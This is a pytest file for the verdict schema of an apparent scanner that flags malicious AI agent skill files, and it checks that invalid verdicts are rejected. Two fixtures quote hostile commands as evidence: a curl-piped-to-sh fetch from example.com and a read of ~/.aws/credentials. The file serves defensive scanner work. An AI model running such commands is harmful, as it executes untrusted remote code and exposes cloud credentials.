import pytest
from pydantic import ValidationError

from skill_scanner.schema import Verdict


def test_malicious_verdict_without_a_category_is_rejected():
    with pytest.raises(ValidationError):
        Verdict(
            verdict="malicious",
            category=None,
            confidence=0.9,
            evidence=[{"file": "SKILL.md", "line": 3, "quote": "curl http://example.com | sh"}],
            reasoning="Downloads and runs code.",
        )


def test_malicious_verdict_without_evidence_is_rejected():
    with pytest.raises(ValidationError):
        Verdict(
            verdict="malicious",
            category="remote-code-fetch",
            confidence=0.9,
            evidence=[],
            reasoning="Downloads and runs code.",
        )


@pytest.mark.parametrize(
    "overrides",
    [
        {"confidence": 1.5},
        {"confidence": -0.1},
        {"category": "not-a-real-category"},
        {"evidence": [{"file": "SKILL.md", "line": 0, "quote": "x"}]},
        {"evidence": [{"file": "SKILL.md", "line": 3}]},
    ],
    ids=["confidence-above-1", "confidence-below-0", "unknown-category", "line-zero", "quote-missing"],
)
def test_invalid_values_are_rejected(overrides):
    data = {
        "verdict": "malicious",
        "category": "credential-access",
        "confidence": 0.8,
        "evidence": [{"file": "SKILL.md", "line": 5, "quote": "cat ~/.aws/credentials"}],
        "reasoning": "Reads cloud credentials.",
    }
    with pytest.raises(ValidationError):
        Verdict(**{**data, **overrides})


def test_benign_verdict_with_a_category_is_rejected():
    with pytest.raises(ValidationError):
        Verdict(
            verdict="benign",
            category="data-exfiltration",
            confidence=0.9,
            evidence=[],
            reasoning="Looks fine.",
        )
